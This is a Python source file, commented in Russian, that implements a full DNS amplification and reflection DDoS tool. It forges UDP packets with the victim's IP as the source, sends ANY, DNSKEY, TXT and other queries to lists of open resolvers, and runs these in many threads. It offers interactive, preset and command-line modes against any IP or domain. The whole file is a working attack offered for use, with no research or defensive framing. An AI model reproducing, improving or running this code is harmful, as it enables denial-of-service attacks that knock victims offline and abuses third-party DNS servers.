#!/usr/bin/env python3
"""
🚀 УСОВЕРШЕНСТВОВАННЫЙ DNS AMPLIFICATION + REFLECTION DDoS АТАКЕР
Поддержка: IP/домены, мульти-режимы, RAW sockets, статистика в реальном времени
"""

import socket
import struct
import random
import threading
import time
import os
import sys
import ipaddress
from dataclasses import dataclass
from typing import List, Tuple, Dict
import argparse

@dataclass
class AttackStats:
    """Статистика атаки в реальном времени"""
    queries_sent: int = 0
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = 0
    is_running: bool = False

class DNSAmplificationEngine:
    """ДВИЖОК DNS AMPLIFICATION АТАК"""
    
    def __init__(self):
        self.stats = AttackStats()
        self.stats_lock = threading.Lock()
        self.attack_types = {
            "any": (255, "ANY запрос - максимальное усиление"),
            "dnskey": (48, "DNSKEY запрос - DNSSEC усиление"), 
            "txt": (16, "TXT запрос - большие текстовые записи"),
            "mx": (15, "MX запрос - почтовые серверы"),
            "ns": (2, "NS запрос - серверы имен"),
            "soa": (6, "SOA запрос - информация о зоне")
        }
        
    def resolve_target(self, target: str) -> str:
        """
        Разрешает цель в IP адрес
        Поддерживает: IP, домены, URL
        """
        # Если это IP - возвращаем как есть
        try:
            ipaddress.ip_address(target)
            print(f"🎯 Цель: IP адрес {target}")
            return target
        except ValueError:
            pass
        
        # Если это домен - разрешаем
        print(f"🔍 Разрешаем домен: {target}")
        
        # Убираем протокол если есть
        if '://' in target:
            target = target.split('://')[1]
        # Убираем путь если есть
        if '/' in target:
            target = target.split('/')[0]
        
        try:
            ip = socket.gethostbyname(target)
            print(f"✅ Домен {target} → {ip}")
            return ip
        except socket.gaierror as e:
            print(f"❌ Не удалось разрешить домен {target}: {e}")
            return None

    def load_amplifiers(self, attack_type: str) -> List[Tuple[str, int]]:
        """
        Загружает усилители для конкретного типа атаки
        """
        filename = f"dns_{attack_type}.txt"
        amplifiers = []
        
        if not os.path.exists(filename):
            print(f"⚠️ Файл {filename} не найден")
            # Пробуем общий файл
            if os.path.exists("dns_amplifiers.txt"):
                filename = "dns_amplifiers.txt"
                print(f"🔄 Используем общий файл: {filename}")
            else:
                return []
        
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    # Пропускаем комментарии и пустые строки
                    if not line or line.startswith('#'):
                        continue
                    
                    # Убираем комментарии из середины строки
                    if '#' in line:
                        line = line.split('#')[0].strip()
                    
                    # Проверяем валидность IP
                    try:
                        ipaddress.ip_address(line)
                        amplifiers.append((line, 53))
                    except ValueError:
                        print(f"⚠️ Неверный IP в строке {line_num}: {line}")
            
            print(f"✅ Загружено {len(amplifiers)} усилителей из {filename}")
            return amplifiers
            
        except Exception as e:
            print(f"❌ Ошибка загрузки {filename}: {e}")
            return []

    def create_dns_packet(self, query_type: int, domain: bytes = None) -> bytes:
        """
        Создает DNS пакет для amplification атаки
        """
        # Случайный ID транзакции
        transaction_id = random.randint(0, 65535)
        
        # Флаги: стандартный запрос + рекурсия
        flags = 0x0100
        
        # DNS заголовок: ID, Flags, QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
        header = struct.pack('>HHHHHH', transaction_id, flags, 1, 0, 0, 0)
        
        # Выбор домена для запроса
        if domain is None:
            domain = self._get_optimized_domain(query_type)
        
        # DNS вопрос: QNAME, QTYPE, QCLASS=1 (IN)
        question = domain + struct.pack('>HH', query_type, 1)
        
        return header + question

    def _get_optimized_domain(self, query_type: int) -> bytes:
        """
        Возвращает оптимизированные домены для разных типов запросов
        """
        domains = {
            # ANY запросы - домены с максимальным количеством записей
            255: [
                b'\x00',                              # корневая зона .
                b'\x03com\x00',                       # com
                b'\x03org\x00',                       # org
                b'\x03net\x00',                       # net
                b'\x06google\x03com\x00',             # google.com
                b'\x08facebook\x03com\x00',           # facebook.com
                b'\x09microsoft\x03com\x00',          # microsoft.com
                b'\x06amazon\x03com\x00',             # amazon.com
                b'\x02is\x03org\x00',                 # isc.org
            ],
            
            # DNSKEY запросы - домены с DNSSEC
            48: [
                b'\x00',                              # .
                b'\x03com\x00',                       # com
                b'\x03org\x00',                       # org
                b'\x03net\x00',                       # net
                b'\x02de\x00',                        # de
                b'\x02fr\x00',                        # fr
                b'\x06google\x03com\x00',             # google.com
                b'\x08facebook\x03com\x00',           # facebook.com
            ],
            
            # TXT запросы - домены с большими TXT записями
            16: [
                b'\x0b_cloudflare\x04auth\x03key\x05site\x00',  # _cloudflare.auth.key.site
                b'\x13_dmarc\x0bpaypal-inc\x03com\x00',         # _dmarc.paypal-inc.com
                b'\x06google\x03com\x00',                       # google.com
                b'\x08facebook\x03com\x00',                     # facebook.com
            ],
            
            # MX запросы - почтовые домены
            15: [
                b'\x06google\x03com\x00',             # google.com
                b'\x06yahoo\x03com\x00',              # yahoo.com
                b'\x07outlook\x03com\x00',            # outlook.com
                b'\x04aol\x03com\x00',                # aol.com
            ],
            
            # NS запросы - домены с серверами имен
            2: [
                b'\x00',                              # .
                b'\x03com\x00',                       # com
                b'\x03org\x00',                       # org
                b'\x03net\x00',                       # net
            ],
            
            # SOA запросы - информация о зонах
            6: [
                b'\x00',                              # .
                b'\x03com\x00',                       # com
                b'\x03org\x00',                       # org
                b'\x03net\x00',                       # net
            ]
        }
        
        return random.choice(domains.get(query_type, domains[255]))

    def check_raw_sockets(self) -> bool:
        """
        Проверяет доступность RAW sockets (требуются права администратора)
        """
        print("🔍 Проверка RAW sockets...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.close()
            print("✅ RAW sockets доступны")
            return True
        except PermissionError:
            print("❌ Требуются права администратора!")
            return False
        except Exception as e:
            print(f"❌ Ошибка RAW sockets: {e}")
            return False

    def calculate_checksum(self, data: bytes) -> int:
        """
        Расчет checksum для IP/UDP заголовков
        """
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xffff) + (checksum >> 16)
        
        return ~checksum & 0xffff

    def calculate_udp_checksum(self, src_ip: str, dst_ip: str, src_port: int, 
                              dst_port: int, data: bytes) -> int:
        """
        Расчет UDP checksum с псевдо-заголовком
        """
        # Псевдо-заголовок UDP
        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(dst_ip)
        protocol = socket.IPPROTO_UDP
        udp_length = 8 + len(data)
        
        pseudo_header = struct.pack('!4s4sBBH',
                                  src_ip_bytes, dst_ip_bytes,
                                  0, protocol, udp_length)
        
        # UDP заголовок без checksum
        udp_header = struct.pack('!HHH', src_port, dst_port, udp_length)
        
        # Объединяем все для расчета checksum
        checksum_data = pseudo_header + udp_header + data
        
        return self.calculate_checksum(checksum_data)

    def create_ip_header(self, src_ip: str, dst_ip: str, data_len: int) -> bytes:
        """
        Создает ПРАВИЛЬНЫЙ IP заголовок с checksum
        """
        # IP заголовок: версия=4, IHL=5, TOS=0, Total Length, ID, Flags, TTL=255, Protocol=17(UDP)
        ip_ver_ihl = 0x45
        ip_tos = 0
        ip_total_len = 20 + 8 + data_len  # IP + UDP + данные
        ip_id = random.randint(0, 65535)
        ip_frag_offset = 0x4000  # Don't Fragment flag
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0  # Временно 0 для расчета
        
        # Создаем заголовок с временным checksum=0
        ip_header_without_check = struct.pack('!BBHHHBBH4s4s',
                                            ip_ver_ihl, ip_tos, ip_total_len,
                                            ip_id, ip_frag_offset,
                                            ip_ttl, ip_proto, ip_check,
                                            socket.inet_aton(src_ip),
                                            socket.inet_aton(dst_ip))
        
        # Расчет правильного IP checksum
        ip_check = self.calculate_checksum(ip_header_without_check)
        
        # Пересобираем с правильным checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              ip_ver_ihl, ip_tos, ip_total_len,
                              ip_id, ip_frag_offset,
                              ip_ttl, ip_proto, ip_check,
                              socket.inet_aton(src_ip),
                              socket.inet_aton(dst_ip))
        return ip_header

    def create_udp_header(self, src_ip: str, dst_ip: str, src_port: int, 
                         dst_port: int, data: bytes) -> bytes:
        """
        Создает ПРАВИЛЬНЫЙ UDP заголовок с checksum
        """
        udp_length = 8 + len(data)
        
        # Расчет правильного UDP checksum
        udp_check = self.calculate_udp_checksum(src_ip, dst_ip, src_port, dst_port, data)
        
        # Создаем UDP заголовок
        udp_header = struct.pack('!HHHH', 
                               src_port, dst_port, 
                               udp_length, udp_check)
        return udp_header

    def send_amplification_attack(self, target: str, attack_type: str, 
                                duration: int = 30, threads: int = 50,
                                packets_per_second: int = 1000,
                                stop_event: threading.Event = None) -> int:
        """
        Основной метод запуска amplification атаки с поддержкой остановки
        """
        # Разрешаем цель
        target_ip = self.resolve_target(target)
        if not target_ip:
            return 0
        
        # Проверяем RAW sockets
        if not self.check_raw_sockets():
            return 0
        
        # Получаем тип запроса
        if attack_type not in self.attack_types:
            print(f"❌ Неизвестный тип атаки: {attack_type}")
            print(f"📋 Доступные: {', '.join(self.attack_types.keys())}")
            return 0
        
        query_type, description = self.attack_types[attack_type]
        print(f"🎯 Тип атаки: {attack_type.upper()} - {description}")
        
        # Загружаем усилители
        amplifiers = self.load_amplifiers(attack_type)
        if not amplifiers:
            print(f"❌ Нет усилителей для атаки {attack_type}")
            return 0
        
        # Инициализируем статистику
        self.stats = AttackStats()
        self.stats.start_time = time.time()
        self.stats.is_running = True
        
        # Создаем stop_event если не передан
        if stop_event is None:
            stop_event = threading.Event()
        
        print(f"\n🚀 ЗАПУСК АТАКИ:")
        print(f"   Цель: {target} -> {target_ip}")
        print(f"   Тип: {attack_type.upper()}")
        print(f"   DNS серверов: {len(amplifiers)}")
        print(f"   Потоков: {threads}")
        print(f"   Длительность: {duration} сек")
        print(f"   Скорость: ~{packets_per_second} пакетов/сек")
        print("-" * 50)
        
        # Запускаем потоки атаки
        thread_pool = []
        for i in range(threads):
            thread = threading.Thread(
                target=self._attack_worker,
                args=(target_ip, amplifiers, query_type, duration, packets_per_second, i+1, stop_event)
            )
            thread.daemon = True
            thread.start()
            thread_pool.append(thread)
        
        # Запускаем мониторинг
        monitor_thread = threading.Thread(target=self._stats_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Ожидаем завершения с обработкой прерывания
        try:
            # Ждем завершения по времени или stop_event
            end_time = time.time() + duration
            while time.time() < end_time and not stop_event.is_set():
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\n⏹️ АТАКА ПРЕРВАНА ПОЛЬЗОВАТЕЛЕМ")
            stop_event.set()
        
        finally:
            # Останавливаем атаку
            stop_event.set()
            self.stats.is_running = False
            
            # Ждем завершения потоков
            print("🔄 Ожидание завершения потоков...")
            for thread in thread_pool:
                thread.join(timeout=2)
            
            time.sleep(1)  # Даем время для финального обновления статистики
        
        # Выводим финальную статистику
        self._print_final_stats()
        
        return self.stats.queries_sent

    def _attack_worker(self, target_ip: str, amplifiers: List[Tuple[str, int]], 
                      query_type: int, duration: int, pps: int, worker_id: int,
                      stop_event: threading.Event = None):
        """
        Рабочий поток для отправки amplification запросов с оптимизированными задержками
        """
        # Расчет оптимального batch size и задержки
        if pps > 0:
            batch_size = max(1, min(pps // len(amplifiers) // 10, 100))  # Автоподбор batch
            target_delay = 1.0 / pps if pps > 100 else 0  # Задержка только при высокой скорости
        else:
            batch_size = 50  # Дефолтный batch
            target_delay = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # 🔧 ОПТИМИЗАЦИЯ: Устанавливаем буферы отправки
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)  # 1MB buffer
        except Exception as e:
            print(f"❌ Поток {worker_id}: Ошибка создания сокета: {e}")
            return
        
        start_time = time.time()
        packets_sent = 0
        last_batch_time = time.time()
        
        # 🔧 ОПТИМИЗАЦИЯ: Предварительное создание пакетов
        prepared_packets = []
        for _ in range(min(batch_size * 2, 200)):  # Заранее готовим пакеты
            dns_server, dns_port = random.choice(amplifiers)
            dns_query = self.create_dns_packet(query_type)
            src_port = random.randint(1024, 65535)
            
            ip_header = self.create_ip_header(target_ip, dns_server, len(dns_query))
            udp_header = self.create_udp_header(target_ip, dns_server, src_port, dns_port, dns_query)
            prepared_packets.append((ip_header + udp_header + dns_query, dns_server, dns_port))
        
        packet_index = 0
        
        while (not stop_event or not stop_event.is_set()) and \
              (time.time() - start_time) < duration:
            try:
                batch_packets = 0
                batch_start = time.time()
                
                # 🔧 ОПТИМИЗАЦИЯ: Пакетная отправка без задержек между пакетами
                for _ in range(batch_size):
                    if packet_index >= len(prepared_packets):
                        # Обновляем пул пакетов
                        prepared_packets = []
                        for _ in range(min(batch_size * 2, 200)):
                            dns_server, dns_port = random.choice(amplifiers)
                            dns_query = self.create_dns_packet(query_type)
                            src_port = random.randint(1024, 65535)
                            
                            ip_header = self.create_ip_header(target_ip, dns_server, len(dns_query))
                            udp_header = self.create_udp_header(target_ip, dns_server, src_port, dns_port, dns_query)
                            prepared_packets.append((ip_header + udp_header + dns_query, dns_server, dns_port))
                        packet_index = 0
                    
                    packet, dns_server, dns_port = prepared_packets[packet_index]
                    packet_index += 1
                    
                    sock.sendto(packet, (dns_server, dns_port))
                    packets_sent += 1
                    batch_packets += 1
                
                # 🔧 ОПТИМИЗАЦИЯ: Динамическая регулировка скорости
                batch_time = time.time() - batch_start
                current_pps = batch_packets / batch_time if batch_time > 0 else 0
                
                if pps > 0 and current_pps > pps * 1.1:  # Если превышаем целевую скорость
                    # Увеличиваем batch size для уменьшения накладных расходов
                    batch_size = min(batch_size + 5, 500)
                    if target_delay > 0:
                        target_delay *= 0.95  # Уменьшаем задержку
                elif pps > 0 and current_pps < pps * 0.9:  # Если недобираем скорость
                    # Уменьшаем batch size для более точного контроля
                    batch_size = max(batch_size - 2, 1)
                
                # 🔧 ОПТИМИЗАЦИЯ: Умная задержка между батчами
                if pps > 0 and target_delay > 0:
                    expected_batch_time = batch_size / pps
                    actual_batch_time = time.time() - batch_start
                    sleep_time = max(0, expected_batch_time - actual_batch_time)
                    
                    if sleep_time > 0:
                        # Используем точный sleep для контроля скорости
                        end_time = time.time() + sleep_time
                        while time.time() < end_time:
                            if stop_event and stop_event.is_set():
                                break
                            time.sleep(0.001)  # Короткие sleep для быстрой реакции на stop
                        
                # Обновляем статистику каждые 1000 пакетов или 1 секунду
                if packets_sent >= 1000 or (time.time() - last_batch_time) >= 1.0:
                    with self.stats_lock:
                        self.stats.queries_sent += packets_sent
                        self.stats.packets_sent += packets_sent
                        self.stats.bytes_sent += packets_sent * len(prepared_packets[0][0]) if prepared_packets else 0
                    
                    packets_sent = 0
                    last_batch_time = time.time()
                    
            except Exception as e:
                with self.stats_lock:
                    self.stats.errors += 1
                continue
        
        # Финальное обновление статистики
        if packets_sent > 0:
            with self.stats_lock:
                self.stats.queries_sent += packets_sent
                self.stats.packets_sent += packets_sent
                self.stats.bytes_sent += packets_sent * len(prepared_packets[0][0]) if prepared_packets else 0
        
        sock.close()

    def _stats_monitor(self):
        """
        Мониторинг статистики в реальном времени
        """
        last_queries = 0
        last_time = time.time()
        
        print("\n📊 СТАТИСТИКА В РЕАЛЬНОМ ВРЕМЕНИ:")
        print("Время | Запросы | QPS | Ошибки | Трафик | Усиление")
        print("-" * 60)
        
        while self.stats.is_running:
            current_time = time.time()
            elapsed = current_time - self.stats.start_time
            
            if elapsed >= 1.0:  # Обновляем каждую секунду
                with self.stats_lock:
                    current_queries = self.stats.queries_sent
                    current_errors = self.stats.errors
                    current_bytes = self.stats.bytes_sent
                
                time_diff = current_time - last_time
                qps = (current_queries - last_queries) / time_diff if time_diff > 0 else 0
                
                # Расчет трафика
                traffic_mb = current_bytes / 1024 / 1024
                amplified_traffic_gb = (current_queries * 4096) / 1024 / 1024 / 1024  # Предполагаем 4KB ответ
                
                print(f"{elapsed:5.1f}s | {current_queries:7,} | {qps:4.0f} | {current_errors:6} | {traffic_mb:5.1f}MB | {amplified_traffic_gb:5.2f}GB")
                
                last_queries = current_queries
                last_time = current_time
            
            time.sleep(1)

    def _print_final_stats(self):
        """
        Выводит финальную статистику атаки
        """
        total_time = time.time() - self.stats.start_time
        
        print(f"\n🎯 ФИНАЛЬНАЯ СТАТИСТИКА:")
        print(f"📤 Запросов отправлено: {self.stats.queries_sent:,}")
        print(f"📦 Пакетов отправлено: {self.stats.packets_sent:,}")
        print(f"📊 Байт отправлено: {self.stats.bytes_sent:,} ({self.stats.bytes_sent/1024/1024:.1f} MB)")
        print(f"❌ Ошибок: {self.stats.errors:,}")
        print(f"⏱️ Время: {total_time:.1f} сек")
        
        if self.stats.queries_sent > 0 and total_time > 0:
            qps = self.stats.queries_sent / total_time
            amplified_traffic_gb = (self.stats.queries_sent * 4096) / 1024 / 1024 / 1024
            amplified_traffic_mbps = (self.stats.queries_sent * 4096 * 8) / total_time / 1_000_000
            
            print(f"⚡ Средний QPS: {qps:.0f}")
            print(f"💥 Усиленный трафик: {amplified_traffic_gb:.2f} GB")
            print(f"🌐 Пропускная способность: {amplified_traffic_mbps:.1f} Mbps")
            print(f"🔥 Коэффициент усиления: ~40x")

    def multi_attack(self, target: str, duration: int = 30, threads: int = 50):
        """
        Запускает все доступные типы атак параллельно
        """
        target_ip = self.resolve_target(target)
        if not target_ip:
            return 0
        
        print("🔍 Поиск доступных атак...")
        available_attacks = []
        
        for attack_type in self.attack_types.keys():
            if os.path.exists(f"dns_{attack_type}.txt") or os.path.exists("dns_amplifiers.txt"):
                available_attacks.append(attack_type)
                print(f"✅ {attack_type.upper()} - {self.attack_types[attack_type][1]}")
        
        if not available_attacks:
            print("❌ Нет доступных атак! Создайте файлы dns_*.txt")
            return 0
        
        print(f"\n🚀 ЗАПУСК {len(available_attacks)} АТАК ПАРАЛЛЕЛЬНО...")
        
        results = []
        results_lock = threading.Lock()
        total_start = time.time()
        
        # Флаг для остановки всех атак
        stop_event = threading.Event()
        
        def run_attack(attack_type: str):
            try:
                # Передаем stop_event в каждую атаку
                result = self.send_amplification_attack(
                    target, attack_type, duration, threads, stop_event=stop_event
                )
                with results_lock:
                    results.append((attack_type, result))
                print(f"✅ {attack_type.upper()} завершена: {result:,} запросов")
            except Exception as e:
                print(f"❌ {attack_type.upper()} ошибка: {e}")
        
        # Запускаем все атаки параллельно
        attack_threads = []
        for attack_type in available_attacks:
            thread = threading.Thread(target=run_attack, args=(attack_type,))
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        # Ожидаем завершения с обработкой прерывания
        try:
            # Ждем завершения всех потоков или истечения времени
            for thread in attack_threads:
                thread.join(timeout=duration)
            
            # Если время вышло, останавливаем атаки
            if time.time() - total_start >= duration:
                print("⏰ Время атаки истекло")
                stop_event.set()
        
        except KeyboardInterrupt:
            print("\n⏹️ MULTI-АТАКА ПРЕРВАНА ПОЛЬЗОВАТЕЛЕМ")
            stop_event.set()
            
            # Даем потокам время на остановку
            print("🔄 Остановка потоков...")
            for thread in attack_threads:
                thread.join(timeout=2)
        
        finally:
            # Убеждаемся, что все остановлено
            stop_event.set()
            time.sleep(1)
        
        total_time = time.time() - total_start
        
        # Сводная статистика
        print(f"\n📊 СВОДКА ВСЕХ АТАК:")
        total_queries = 0
        for attack_type, queries in results:
            status = "✅" if queries > 0 else "❌"
            print(f"  {status} {attack_type.upper()}: {queries:,} запросов")
            total_queries += queries
        
        print(f"📤 Всего запросов: {total_queries:,}")
        print(f"⏱ Общее время: {total_time:.1f} сек")
        
        if total_queries > 0:
            amplified_traffic_gb = (total_queries * 4096) / 1024 / 1024 / 1024
            print(f"💥 Общий усиленный трафик: {amplified_traffic_gb:.2f} GB")
        
        return total_queries

    def interactive_mode(self):
        """
        Интерактивный режим с пошаговым вводом параметров
        """
        print("\n🎮 ИНТЕРАКТИВНЫЙ РЕЖИМ")
        print("=" * 40)
        
        # Ввод цели
        while True:
            target = input("\n🎯 Введите цель (IP/домен/URL): ").strip()
            if target:
                break
            print("❌ Цель не может быть пустой")
        
        # Выбор типа атаки
        print("\n📋 ВЫБЕРИТЕ ТИП АТАКИ:")
        print("1. ANY - максимальное усиление")
        print("2. DNSKEY - DNSSEC усиление") 
        print("3. TXT - большие текстовые записи")
        print("4. MX - почтовые серверы")
        print("5. NS - серверы имен")
        print("6. SOA - информация о зонах")
        print("7. MULTI - все доступные атаки")
        
        attack_choice = input("\nВыберите номер (1-7): ").strip()
        attack_map = {
            '1': 'any', '2': 'dnskey', '3': 'txt',
            '4': 'mx', '5': 'ns', '6': 'soa', '7': 'multi'
        }
        
        attack_type = attack_map.get(attack_choice, 'multi')
        
        # Длительность атаки
        while True:
            try:
                duration = input("\n⏱️ Длительность атаки в секундах [30]: ").strip()
                duration = int(duration) if duration else 30
                if duration > 0:
                    break
                print("❌ Длительность должна быть больше 0")
            except ValueError:
                print("❌ Введите число")
        
        # Количество потоков
        while True:
            try:
                threads = input("\n⚡ Количество потоков [50]: ").strip()
                threads = int(threads) if threads else 50
                if threads > 0:
                    break
                print("❌ Количество потоков должно быть больше 0")
            except ValueError:
                print("❌ Введите число")
        
        # Скорость атаки
        while True:
            try:
                pps = input("\n🚀 Пакетов в секунду [1000]: ").strip()
                pps = int(pps) if pps else 1000
                if pps > 0:
                    break
                print("❌ Скорость должна быть больше 0")
            except ValueError:
                print("❌ Введите число")
        
        # Подтверждение
        print(f"\n🎯 ПАРАМЕТРЫ АТАКИ:")
        print(f"   Цель: {target}")
        print(f"   Тип: {attack_type.upper()}")
        print(f"   Длительность: {duration} сек")
        print(f"   Потоков: {threads}")
        print(f"   Скорость: {pps} пакетов/сек")
        
        confirm = input("\n🚀 Запустить атаку? (y/N): ").strip().lower()
        if confirm not in ['y', 'yes', 'д', 'да']:
            print("❌ Атака отменена")
            return
        
        # Запуск атаки
        print("\n" + "="*50)
        if attack_type == 'multi':
            self.multi_attack(target, duration, threads)
        else:
            self.send_amplification_attack(target, attack_type, duration, threads, pps)

    def quick_attack_mode(self):
        """
        Режим быстрой атаки с предустановками
        """
        print("\n⚡ РЕЖИМ БЫСТРОЙ АТАКИ")
        print("=" * 35)
        
        presets = {
            '1': {'name': 'ЛЕГКАЯ', 'threads': 20, 'pps': 500, 'duration': 30},
            '2': {'name': 'СРЕДНЯЯ', 'threads': 50, 'pps': 1000, 'duration': 45},
            '3': {'name': 'МОЩНАЯ', 'threads': 100, 'pps': 2000, 'duration': 60},
            '4': {'name': 'МАКСИМУМ', 'threads': 200, 'pps': 5000, 'duration': 90}
        }
        
        print("\n📊 ПРЕДУСТАНОВКИ:")
        for key, preset in presets.items():
            print(f"{key}. {preset['name']} - {preset['threads']} потоков, {preset['pps']} pps, {preset['duration']} сек")
        
        choice = input("\nВыберите preset (1-4): ").strip()
        preset = presets.get(choice, presets['2'])
        
        target = input("\n🎯 Введите цель: ").strip()
        if not target:
            print("❌ Цель не может быть пустой")
            return
        
        attack_type = input("📋 Тип атаки [any]: ").strip() or 'any'
        
        print(f"\n🚀 ЗАПУСК {preset['name']} АТАКИ...")
        print(f"🎯 Цель: {target}")
        print(f"📊 Параметры: {preset['threads']} потоков, {preset['pps']} pps, {preset['duration']} сек")
        
        if attack_type == 'multi':
            self.multi_attack(target, preset['duration'], preset['threads'])
        else:
            self.send_amplification_attack(target, attack_type, preset['duration'], 
                                         preset['threads'], preset['pps'])

def main():
    """
    Основная функция для запуска из командной строки
    """
    # Если есть аргументы - используем CLI режим
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description='🚀 DNS Amplification + Reflection DDoS Атакер')
        parser.add_argument('target', help='Цель (IP, домен или URL)')
        parser.add_argument('-t', '--type', default='multi', 
                           choices=['any', 'dnskey', 'txt', 'mx', 'ns', 'soa', 'multi'],
                           help='Тип атаки (по умолчанию: multi)')
        parser.add_argument('-d', '--duration', type=int, default=30, 
                           help='Длительность атаки в секундах')
        parser.add_argument('--threads', type=int, default=50, 
                           help='Количество потоков')
        parser.add_argument('--pps', type=int, default=1000,
                           help='Пакетов в секунду (на поток)')
        parser.add_argument('--interactive', action='store_true',
                           help='Интерактивный режим')
        parser.add_argument('--quick', action='store_true',
                           help='Режим быстрой атаки')
        
        args = parser.parse_args()
        
        # Проверяем права администратора
        if os.name != 'nt' and os.geteuid() != 0:
            print("❌ Требуются права администратора! Запустите: sudo python3 dnsamp.py")
            sys.exit(1)
        
        engine = DNSAmplificationEngine()
        
        print("🚀 ЗАПУСК DNS AMPLIFICATION + REFLECTION DDoS")
        print("=" * 50)
        
        if args.interactive:
            engine.interactive_mode()
        elif args.quick:
            engine.quick_attack_mode()
        elif args.type == 'multi':
            engine.multi_attack(args.target, args.duration, args.threads)
        else:
            engine.send_amplification_attack(
                args.target, args.type, args.duration, args.threads, args.pps
            )
    
    else:
        # Интерактивный режим по умолчанию
        if os.name != 'nt' and os.geteuid() != 0:
            print("❌ Требуются права администратора! Запустите: sudo python3 dnsamp.py")
            sys.exit(1)
        
        engine = DNSAmplificationEngine()
        
        print("🚀 DNS AMPLIFICATION + REFLECTION DDoS АТАКЕР")
        print("=" * 50)
        
        while True:
            print("\n🎮 ВЫБЕРИТЕ РЕЖИМ:")
            print("1. 📝 Интерактивный режим (пошаговый ввод)")
            print("2. ⚡ Быстрая атака (presets)") 
            print("3. 🖥️ Командная строка (аргументы)")
            print("4. 🚪 Выход")
            
            choice = input("\nВыберите вариант (1-4): ").strip()
            
            if choice == '1':
                engine.interactive_mode()
            elif choice == '2':
                engine.quick_attack_mode()
            elif choice == '3':
                print("\n💡 Примеры использования:")
                print("sudo python3 dnsamp.py example.com -t any -d 30 --threads 50")
                print("sudo python3 dnsamp.py 192.168.1.1 -t multi -d 60 --threads 100")
                print("\nДоступные типы: any, dnskey, txt, mx, ns, soa, multi")
                break
            elif choice == '4':
                print("👋 Выход...")
                break
            else:
                print("❌ Неверный выбор")

if __name__ == "__main__":
    main()